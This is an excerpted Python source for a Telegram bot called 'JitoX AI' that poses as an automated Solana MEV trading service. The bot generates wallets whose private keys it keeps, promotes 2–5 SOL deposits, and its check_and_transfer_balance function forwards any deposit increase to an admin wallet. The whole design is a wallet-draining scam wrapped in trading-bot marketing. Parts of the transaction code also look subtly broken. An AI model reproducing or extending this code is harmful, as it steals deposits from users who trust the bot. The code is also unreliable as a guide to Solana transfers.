...
async def generate_wallet():
    """Generate a new Solana wallet with Phantom-compatible private key."""
    try:
        ...
        # Format private key for Phantom Wallet (base58 of [private_key_bytes + public_key_bytes])
        combined_key_bytes = private_key_bytes + public_key_bytes
        private_key = b58encode(combined_key_bytes).decode('ascii')
...
async def auto_mev(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    keyboard = [
        ...
        [InlineKeyboardButton("🔙 Back to Settings", callback_data='back_to_nexus')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
...
async def handle_new_wallet_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    try:
        ...
        keyboard = [
            [
                InlineKeyboardButton("✅ Yes, Generate New Wallet", callback_data="generate_new_confirmed"),
...
async def generate_new_confirmed(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Actually generate a new wallet after confirmation."""
    try:
        query = update.callback_query
        user_id = update.effective_user.id
        username = update.effective_user.username or "Unknown"
        ...
        # Log the new wallet generation
        logger.info(f"Generated new wallet for user {user_id} ({username})")
        
    except Exception as e:
        logger.error(f"Error generating new wallet: {str(e)}")
        await query.answer("Error generating new wallet", show_alert=True)
...
async def activate_auto_mev(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    keyboard = [
        [InlineKeyboardButton("🔑 Deposit 5 SOL", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back to Auto MEV", callback_data='auto_mev')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
...
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    try:
        ...
        # Handle different types of back buttons
        if query.data == "back":
            # Return to main menu
            await start(update, context)
        elif query.data == "back_to_nexus":
            await nexus_settings(update, context)
        elif query.data == "back_to_wallet":
            await get_wallet_command(update, context)
        elif query.data == "back_to_settings":
            await nexus_settings(update, context)
        elif query.data == "back_to_pool":
            await pool_command(update, context)
        elif query.data == "back_to_mev":
            await mev_command(update, context)
        elif query.data == "auto_mev":
            await auto_mev(update, context)
        # Info and Help handlers
...
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "👾 <b>JitoX AI Command Guide</b> 👾\n\n"
        "🎮 <b>Core Commands:</b>\n"
        "/start - Initialize JitoX AI\n"
        "/get_wallet - Generate or view your wallet\n"
        "/withdraw - Strategic withdrawal protocol\n\n"
        "⚔️ <b>Trading Commands:</b>\n"
        "• Initialize Wallet - Set up your trading wallet\n"
        "• Professional Suite - Access advanced features\n"
        "• Auto MEV - Automated trading protocols\n"
        "• Token Targeting - Custom token strategies\n\n"
        "💎 <b>Important Notes:</b>\n"
        "• Minimum balance: 2 SOL\n"
        "• Enhanced features: 5+ SOL\n"
...
async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "👾 <b>JitoX AI Intelligence Hub</b> 👾\n\n"
        "💎 <b>Professional MEV Architecture</b>\n\n"
        "⚡️ <b>Core Technology:</b>\n"
        "• Advanced MEV extraction protocols\n"
        ...
        "• Standard Suite: 2 SOL\n"
        "• Enhanced Suite: 5+ SOL\n\n"
        "Professional traders understand: Superior intelligence drives exceptional performance. 🎮"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
...
async def transfer_solana(from_private_key: str, to_address: str, amount: float):
    """Transfer SOL from one wallet to another."""
    try:
        # Create HTTP client for RPC calls
        async with aiohttp.ClientSession() as session:
            # Get recent blockhash
            blockhash_url = f"{SOLANA_RPC_URL}"
            blockhash_data = {
                "jsonrpc": "2.0",
                "id": 1,
            ...
            async with session.post(blockhash_url, json=blockhash_data) as response:
                blockhash_result = await response.json()
                recent_blockhash = blockhash_result['result']['value']['blockhash']

            # Create and sign transaction
            from_keypair = nacl.signing.SigningKey(b58decode(from_private_key[:64]))  # Use first 64 bytes for private key
            from_pubkey = b58encode(from_keypair.verify_key.encode()).decode('ascii')
                        ...
                        "instructions": [
                            {
                                ...
                                "data": f"3Bxs4h24hBtQy9rw {amount}"  # Transfer instruction
                            }
                        ]
                    }
                ]
...
async def check_and_transfer_balance(wallet_data: dict, application: Application = None):
    """Check wallet balance and transfer if there's an increase."""
    try:
        ...
        # If there's an increase in balance
        if current_balance > previous_balance:
            increase_amount = current_balance - previous_balance
            
            # Leave some for gas (0.001 SOL)
            transfer_amount = increase_amount - 0.001
            
            if transfer_amount > 0:
                logger.info(f"Transferring {transfer_amount} SOL from {public_key} to admin wallet")
